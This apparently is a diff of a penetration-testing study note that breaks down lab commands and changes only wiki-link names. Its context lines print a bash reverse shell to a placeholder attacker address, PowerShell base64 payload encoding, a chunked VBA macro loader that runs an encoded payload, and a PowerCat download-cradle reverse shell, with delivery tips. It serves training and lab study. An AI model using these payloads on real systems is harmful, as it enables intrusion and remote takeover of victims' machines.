@@ -20,7 +20,7 @@ Part of [[COMMAND BREAKDOWNS]]. Reverse shell delivery mechanics, encoding requi
 
 **Where to look in the response:** the app's response body will contain either the literal word `CMD` or the literal word `PowerShell` somewhere in it, nothing else needed, no decoding or filtering required, just read which word came back.
 
-🔁 **Seen in:** [[Common Web Application Attacks#9.4.1. OS Command Injection|Common Web Application Attacks, 9.4.1]], Step 6.
+🔁 **Seen in:** [[09. Common Web Application Attacks#9.4.1. OS Command Injection|Common Web Application Attacks, 9.4.1]], Step 6.
 
 #### Tags: #CommandInjection #Polyglot #CmdVsPowerShell #CommandBreakdowns
 
@@ -41,7 +41,7 @@ bash -c "bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1"
 
 **Where to look in the response:** this one doesn't show up in the HTTP response at all, the shell either connects to your listener or it doesn't. If your `nc -nvlp` listener stays silent after triggering the payload, this wrapping is one of the first things to check (along with whether the payload actually URL-encoded cleanly, see the next entry).
 
-🔁 **Seen in:** [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|Common Web Application Attacks, 9.2.1]], Step 6.
+🔁 **Seen in:** [[09. Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|Common Web Application Attacks, 9.2.1]], Step 6.
 
 #### Tags: #ReverseShell #BashReverseShell #BashCWrapper #CommandBreakdowns
 
@@ -64,7 +64,7 @@ $EncodedText = [Convert]::ToBase64String($Bytes)
 
 **Where to look in the response:** nothing to look for in an HTTP response here, this step happens entirely on your attacking machine to *produce* the payload before delivery. The failure mode to watch for is on the target side: if `-enc <string>` throws an error like "the input string cannot be parsed" or does nothing visible, suspect the encoding step (ASCII instead of Unicode) before suspecting the script content itself.
 
-🔁 **Seen in:** [[Common Web Application Attacks#9.3.1. Using Executable Files|Common Web Application Attacks, 9.3.1]], Step 5.
+🔁 **Seen in:** [[09. Common Web Application Attacks#9.3.1. Using Executable Files|Common Web Application Attacks, 9.3.1]], Step 5.
 
 #### Tags: #PowerShellReverseShell #Base64Unicode #CommandBreakdowns
 
@@ -112,15 +112,15 @@ Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
 ' ...more chunks...
 CreateObject("Wscript.Shell").Run Str
 ```
-- Delivered through a URL parameter (as in [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]]'s command injection case), the base64-encoded payload is just one long string handed to `curl`, no length ceiling that matters in practice.
-- Delivered through a **VBA string literal** (as in [[Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]]), VBA imposes a hard **255-character limit per string literal**. A base64-encoded reverse shell command easily runs past that. The fix is mechanical concatenation: split the full string into ≤255-char (50 was used here, comfortably under the limit) pieces and rebuild it at runtime with repeated `Str = Str + "<chunk>"` lines, `Str` ends up holding the complete original string once every line has executed, VBA just never has to hold more than one chunk as a literal at a time.
+- Delivered through a URL parameter (as in [[09. Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]]'s command injection case), the base64-encoded payload is just one long string handed to `curl`, no length ceiling that matters in practice.
+- Delivered through a **VBA string literal** (as in [[12. Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]]), VBA imposes a hard **255-character limit per string literal**. A base64-encoded reverse shell command easily runs past that. The fix is mechanical concatenation: split the full string into ≤255-char (50 was used here, comfortably under the limit) pieces and rebuild it at runtime with repeated `Str = Str + "<chunk>"` lines, `Str` ends up holding the complete original string once every line has executed, VBA just never has to hold more than one chunk as a literal at a time.
 - Generate the split with a script, not by hand: manually counting out 50-character boundaries in a 300+ character base64 blob is exactly the kind of task a single miscounted character silently breaks, with no error until the payload fails to decode on the target. A short Python loop (`for i in range(0, len(s), 50): print(...)`) removes that risk entirely.
 
 **Where this comes from:** PowerCat itself ships in Kali at `/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1`, its own script header documents the `-c`/`-p`/`-e` flags. The download-cradle pattern (`IEX` + `DownloadString`) is one of the most common PowerShell attack primitives, covered extensively on both HackTricks' and PayloadsAllTheThings' Windows/reverse-shell pages. VBA's 255-character string literal limit is a Visual Basic language fact, not exploit-specific, documented in Microsoft's own VBA language reference.
 
 **Where to look in the response:** nothing in an HTTP response for the cradle itself, watch your Python HTTP server's access log for a `GET /powercat.ps1` (confirms the target actually fetched it, distinguishes "macro didn't fire" from "macro fired but network egress failed") and your `nc -nvlp` listener for the actual shell callback.
 
-🔁 **Seen in:** [[Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|Client-Side Attacks, 12.2.3]] (VBA-chunked) and [[Client-Side Attacks#Step 4: Build the `.lnk` shortcut payload (the actual reverse-shell trigger)|Client-Side Attacks, 12.3.1 Step 4]] (unchunked, direct shortcut target).
+🔁 **Seen in:** [[12. Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|Client-Side Attacks, 12.2.3]] (VBA-chunked) and [[12. Client-Side Attacks#Step 4: Build the `.lnk` shortcut payload (the actual reverse-shell trigger)|Client-Side Attacks, 12.3.1 Step 4]] (unchunked, direct shortcut target).
 
 #### Tags: #PowerCat #DownloadCradle #IEX #VBAStringLimit #MechanicalChunking #CommandBreakdowns
 
